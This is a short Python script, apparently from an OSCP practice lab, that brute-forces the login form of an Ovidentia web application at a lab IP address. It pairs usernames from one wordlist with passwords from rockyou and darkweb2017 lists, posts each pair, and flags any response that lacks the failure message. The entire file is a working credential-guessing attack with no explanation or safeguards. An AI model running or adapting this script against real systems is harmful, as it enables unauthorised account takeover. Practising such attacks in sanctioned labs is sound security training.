#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring
from lxml import etree

"""
proxies = {
    "http": "http://10.11.0.60:8080"
}
"""

user_files = [  # '/root/oscplab/labtargets/dot73/garry.list',
    '/usr/share/wordlists/users_admin_root.list',
    # '/usr/share/wordlists/thinc_users.list']
]

pass_files = [
    # '/usr/share/wordlists/darkweb2017-top10.txt',
    # '/usr/share/wordlists/thinc_passwords.list',
    # '/usr/share/wordlists/darkweb2017-top11-100.txt',
    # '/usr/share/wordlists/darkweb2017-top101-1000.txt',
    '/usr/share/wordlists/darkweb2017-top1001-10000.txt',
    '/usr/share/wordlists/rockyou.txt']

for user_file in user_files:
    print("\n ***Opening userfile: ", user_file, " ***\n")
    with open(user_file) as u:
        for line in u:
            lineu = line.strip()

            for pass_file in pass_files:
                with open(pass_file) as p:
                    print("Opening passfile: ", pass_file, " username:", lineu)
                    for line in p:
                        linep = line.rstrip()

                        payload = {'tg': 'login',
                                   'referer': 'index.php',
                                   'login': 'login',
                                   'sAuthType': 'Ovidentia',
                                   'nickname': lineu,
                                   'password': linep,
                                   'submit': 'Login'}

                        url = 'http://10.11.1.73:8080/php/index.php'
                        req = requests.post(url, data=payload)  # , proxies=proxies)

                        tree = fromstring(req.content)
                        soup = BeautifulSoup(req.text, 'lxml')
                        failure = soup.body.findAll(text='User not found or bad password')
                        to_string = etree.tostring(tree)

                        if linep != '' and failure == []:
                            print("\n***", lineu, "/", linep, "is interesting ***\n")
                            print("Failure:", failure, "(if this is empty, there was no failed authentication)")
                            print("tostring:", to_string)
